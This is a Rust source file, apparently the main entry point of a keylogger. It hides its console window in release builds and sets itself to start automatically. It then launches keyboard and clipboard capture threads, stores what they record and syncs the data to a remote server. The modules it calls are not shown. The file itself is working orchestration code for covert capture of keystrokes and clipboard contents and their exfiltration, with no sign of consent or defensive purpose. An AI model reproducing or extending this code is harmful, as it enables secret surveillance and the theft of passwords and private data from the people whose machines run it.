#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::sync::Arc;
use tokio::signal;
use tokio::task::JoinHandle;
use tokio::time::Duration;
use futures::future::select_all;

mod app_config;
mod errors;
mod event_types;
mod internal_logger;
mod core_monitors;
mod processing;
mod storage;
mod network;
mod services;
mod system_utils;

use app_config::Settings;
use errors::AppError;

async fn bridge_std_to_tokio<T: Send + 'static>(
    std_rx: std::sync::mpsc::Receiver<T>,
    tokio_tx: tokio::sync::mpsc::Sender<T>,
    channel_name: &'static str,
) {
    tokio::task::spawn_blocking(move || {
        for data in std_rx {
            if tokio_tx.blocking_send(data).is_err() {
                tracing::error!("Bridge {}: Tokio channel closed while sending. Bridge task ending.", channel_name);
                break;
            }
        }
        tracing::info!("Bridge {}: Standard MPSC channel closed, bridge task for {} ending.", channel_name, channel_name);
    }).await.unwrap_or_else(|join_err| {
        tracing::error!("Bridge task for {} panicked: {}", channel_name, join_err);
    });
}


#[tokio::main]
async fn main() -> Result<(), AppError> {
    let settings = match Settings::new() {
        Ok(s) => s,
        Err(e) => {
            eprintln!("FATAL: Configuration error: {}. Ensure 'client_settings.toml' exists and is valid in expected locations.", e);
            #[cfg(debug_assertions)]
            std::thread::sleep(std::time::Duration::from_secs(5));
            return Err(e);
        }
    };

    if let Err(e) = internal_logger::init_logging(&settings) {
        eprintln!("FATAL: Internal logger initialization error: {}", e);
        #[cfg(debug_assertions)]
        std::thread::sleep(std::time::Duration::from_secs(5));
        return Err(e);
    };

    tracing::info!(
        "Application starting. Version: {}. Client ID: {}",
        env!("CARGO_PKG_VERSION"),
        settings.client_id
    );
    tracing::debug!("Loaded settings. Server URL: '{}'", settings.server_url);

    if let Err(e) = system_utils::startup::setup_autostart(&settings) {
        tracing::warn!("Failed to setup autostart: {}. Continuing execution...", e);
    }

    let (shutdown_tx, shutdown_rx_sync_manager) = tokio::sync::watch::channel(false);
    let shutdown_rx_event_processor = shutdown_tx.subscribe();
    let shutdown_rx_log_store = shutdown_tx.subscribe(); // Create and pass this

    let (raw_kb_std_tx, raw_kb_std_rx) = std::sync::mpsc::channel::<core_monitors::keyboard_capture::RawKeyboardData>();
    let (raw_clip_std_tx, raw_clip_std_rx) = std::sync::mpsc::channel::<core_monitors::clipboard_capture::RawClipboardData>();
    
    let (tokio_kb_tx, tokio_kb_rx) = tokio::sync::mpsc::channel(128);
    let (tokio_clip_tx, tokio_clip_rx) = tokio::sync::mpsc::channel(64);

    let _kbd_monitor_thread_handle = core_monitors::keyboard_capture::start_keyboard_monitoring(raw_kb_std_tx)?;
    tracing::info!("Keyboard monitor thread started.");
    
    let _clip_monitor_thread_handle = core_monitors::clipboard_capture::start_clipboard_monitoring(raw_clip_std_tx, Arc::clone(&settings))?;
    tracing::info!("Clipboard monitor thread started.");

    let kb_bridge_task = tokio::spawn(bridge_std_to_tokio(raw_kb_std_rx, tokio_kb_tx, "Keyboard"));
    let clip_bridge_task = tokio::spawn(bridge_std_to_tokio(raw_clip_std_rx, tokio_clip_tx, "Clipboard"));
    tracing::info!("Keyboard and Clipboard bridge tasks started.");

    // Pass shutdown_rx_log_store
    let (log_store_handle, log_store_task) = storage::log_store::create_log_store_handle_and_task(
        Arc::clone(&settings),
        128,
        shutdown_rx_log_store,
    );
    tracing::info!("LogStore actor task started.");

    let event_processor_task = tokio::spawn(processing::event_processor::run_event_processor(
        Arc::clone(&settings),
        tokio_kb_rx,
        tokio_clip_rx,
        log_store_handle.clone(),
        shutdown_rx_event_processor,
    ));
    tracing::info!("Event processor task started.");

    let data_sender = network::data_sender::DataSender::new(Arc::clone(&settings))?;
    tracing::info!("Network data sender initialized.");

    let sync_manager_task = tokio::spawn(services::sync_manager::run_sync_manager(
        Arc::clone(&settings),
        log_store_handle,
        data_sender,
        shutdown_rx_sync_manager,
    ));
    tracing::info!("Sync manager task started.");

    let mut app_logic_tasks: Vec<JoinHandle<Result<(), AppError>>> = vec![
        event_processor_task, 
        sync_manager_task,
        log_store_task,
    ];
    let bridge_join_handles = vec![kb_bridge_task, clip_bridge_task];

    #[cfg(windows)]
    let mut interrupt_signal_stream = signal::windows::ctrl_c().expect("Failed to listen for Ctrl-C");
    #[cfg(unix)]
    let mut interrupt_signal_stream = signal::unix::signal(signal::unix::SignalKind::interrupt()).expect("Failed to install SIGINT handler");

    tokio::select! {
        biased;

        _ = interrupt_signal_stream.recv() => {
            tracing::info!("Interrupt signal (Ctrl+C) received, initiating shutdown...");
        }
        
        res = async {
            if app_logic_tasks.is_empty() {
                std::future::pending().await
            } else {
                let (task_result, index, _) = select_all(app_logic_tasks.iter_mut()).await;
                (task_result, index)
            }
        } => {
            let (task_outcome, task_index) = res;
            tracing::error!(
                "Core application task at index {} exited prematurely. Outcome: {:?}",
                task_index, task_outcome
            );
        }
    }

    tracing::info!("Sending shutdown signal to all long-running tasks...");
    if shutdown_tx.send(true).is_err() {
        tracing::warn!("Failed to send shutdown signal (all receivers dropped). Tasks might have already terminated.");
    }

    tracing::info!("Waiting for application logic tasks to complete shutdown...");
    for (i, task_handle) in app_logic_tasks.into_iter().enumerate() {
        match tokio::time::timeout(Duration::from_secs(10), task_handle).await {
            Ok(Ok(Ok(_))) => tracing::debug!("Application task {} completed successfully during shutdown.", i),
            Ok(Ok(Err(e))) => tracing::error!("Application task {} completed with error during shutdown: {}", i, e),
            Ok(Err(e)) => tracing::error!("Application task {} panicked or was cancelled during shutdown: {}", i, e),
            Err(_) => tracing::warn!("Application task {} timed out during shutdown.", i),
        }
    }

    tracing::info!("Waiting for bridge tasks to complete...");
    for (i, task_handle) in bridge_join_handles.into_iter().enumerate() {
        match tokio::time::timeout(Duration::from_secs(5), task_handle).await {
            Ok(Ok(_)) => tracing::debug!("Bridge task {} completed.", i),
            Ok(Err(e)) => tracing::error!("Bridge task {} panicked: {}", i, e),
            Err(_) => tracing::warn!("Bridge task {} timed out.", i),
        }
    }
    
    tracing::info!("Application shutdown sequence complete.");
    Ok(())
}